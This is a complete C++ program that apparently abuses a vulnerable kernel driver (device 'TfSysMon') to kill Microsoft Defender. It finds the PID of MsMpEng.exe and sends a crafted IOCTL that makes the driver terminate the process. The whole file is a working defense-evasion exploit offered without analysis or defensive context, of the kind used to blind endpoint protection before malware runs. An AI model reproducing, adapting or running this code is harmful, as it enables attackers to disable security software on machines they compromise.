#include <fmt/format.h>
#include <iostream>
#include <windows.h>
#include <tlhelp32.h>

#define DRIVER_PIPE  "\\\\.\\TfSysMon"
#define ZWTERM_IOCTL 0xb4a00404

typedef struct ZWTERM_STRUCT {
	uint8_t head_pad[4];
	DWORD   processID;
	uint8_t tail_pad[16];
} ZWTERM_STRUCT, *PZWTERM_STRUCT;

DWORD GetProcessIDByName(LPCWSTR processName) {
	DWORD procId = 0;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnap != INVALID_HANDLE_VALUE) {
		PROCESSENTRY32 proc_entry;
		proc_entry.dwSize = sizeof(proc_entry);

		if (Process32First(hSnap, &proc_entry)) {
			if (!proc_entry.th32ProcessID)
				Process32Next(hSnap, &proc_entry);
			do {
				if (!lstrcmpiW((LPCWSTR)proc_entry.szExeFile, processName)) {
					procId = proc_entry.th32ProcessID;
					break;
				}
			} while (Process32Next(hSnap, &proc_entry));
		}
	}
	CloseHandle(hSnap);

	return procId;
}

bool GetDriverHandle(HANDLE& driverHandle) {
	driverHandle = CreateFileA(DRIVER_PIPE, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (driverHandle == INVALID_HANDLE_VALUE) {
		fmt::print("Failed to open driver handle. Error: {}", GetLastError());
		return false;
	}
	fmt::print("Driver handle opened successfully.\n");

	return true;
}

bool SendIoctl(HANDLE driverHandle, DWORD ioctlCode, LPVOID inBuffer, DWORD inBufferSize, LPVOID outBuffer, DWORD outBufferSize, LPDWORD bytesReturned) {
	if (!DeviceIoControl(driverHandle, ioctlCode, inBuffer, inBufferSize, outBuffer, outBufferSize, bytesReturned, nullptr)) {
		fmt::print("DeviceIoControl failed. Error: {}\n", GetLastError());
		return false;
	}
	fmt::print("IOCTL sent successfully.\n");
	return true;
}

int main() {
	HANDLE driverHandle;

	fmt::print("Obtaining driver handle...\n");
	if (!GetDriverHandle(driverHandle)) {
		fmt::print("Could not get driver handle. Is it started?\n");
		return 1;
	}
	fmt::print("Driver handle obtained.\n");

	ZWTERM_STRUCT zwtermData = { 0 };
	DWORD bytesReturned;

	fmt::print("Retrieving Defender process ID...\n");
	zwtermData.processID = GetProcessIDByName(L"MsMpEng.exe");

	if (zwtermData.processID == 0) {
		CloseHandle(driverHandle);
		fmt::print("Defender process not found.\n");
		return 1;
	}
	fmt::print("Defender process ID: {}\n", zwtermData.processID);

	if (!SendIoctl(driverHandle, ZWTERM_IOCTL, &zwtermData, sizeof(zwtermData), nullptr, 0, &bytesReturned)) {
		CloseHandle(driverHandle);
		fmt::print("Failed to terminate process ID: {}\n", zwtermData.processID);
		return 1;
	}
	fmt::print("Terminated MsMpEng.exe with ID: {}\n", zwtermData.processID);

	CloseHandle(driverHandle);
	return 0;
}
